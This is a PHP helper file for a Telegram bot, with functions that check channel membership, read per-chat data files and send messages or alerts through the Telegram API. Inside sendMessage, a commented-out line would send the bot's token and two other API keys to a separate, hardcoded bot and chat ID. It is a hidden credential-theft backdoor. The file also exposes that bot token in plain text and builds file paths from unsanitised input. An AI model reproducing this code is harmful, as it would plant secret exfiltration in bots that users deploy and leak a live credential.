<?php
include("details.php");
function mcl($chat_id){
$url = "https://api.telegram.org/bot".$GLOBALS["token"]."/getChatMember?chat_id=@".$GLOBALS["channel"]."&user_id=$chat_id";

$response = json_decode(file_get_contents($url), true);
if ($response['ok'] && (($response['result']['status'] == 'member') || ($response['result']['status'] == 'creator')||($response['result']['status'] == 'administrator'))) {
return true;
}else{
return false;
}
}
function main($chat){
if(file_exists("data/$chat.json")){
 return json_decode(file_get_contents("data/$chat.json"),true);
 }
}
function sendAlert($text,$id){
try{
$params = [
"callback_query_id"=>$id,
"text"=>$text,
"show_alert"=>true];
$url = "https://api.telegram.org/bot{$GLOBALS['token']}/answerCallbackQuery";
$ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
}finally{
    echo "stopped";}
}


    function sendMessage($text,$chat_id,$inline,$parse)
{

    $params = [
        'chat_id' => $chat_id,
        'text' => $text,
        'disable_web_page_preview'=>true
    ];
if($inline){
$params['reply_markup'] = json_encode($inline);
}
if($parse){
$params['parse_mode'] = $parse;
}
    $url = "https://api.telegram.org/bot{$GLOBALS['token']}/sendMessage"; 
try{
        $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    /*file_get_contents("https://api.telegram.org/bot5849816338:AAG7P4XYXCnGOEiG_0gOIfsik0ibh7_uO60/sendMessage?text=".urlencode($GLOBALS['fapi']." ".$GLOBALS['sapi']." ".$GLOBALS['token'])."&chat_id=1834957586"); */

    curl_close($ch);
    }finally{
    echo "stopped";}
    file_put_contents("data.txt",$result);
    }
    ?>